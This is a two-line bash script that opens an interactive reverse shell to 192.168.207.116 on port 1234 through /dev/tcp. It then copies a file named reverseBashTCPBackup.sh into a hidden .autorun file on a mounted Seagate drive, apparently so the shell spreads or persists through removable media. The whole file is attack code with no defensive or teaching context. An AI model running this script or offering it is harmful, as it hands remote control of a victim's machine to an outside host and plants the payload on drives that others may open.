#!/bin/bash

bash -i >& /dev/tcp/192.168.207.116/1234 0>&1

cat ./reverseBashTCPBackup.sh > /media/ausias/Seagate/.autorun
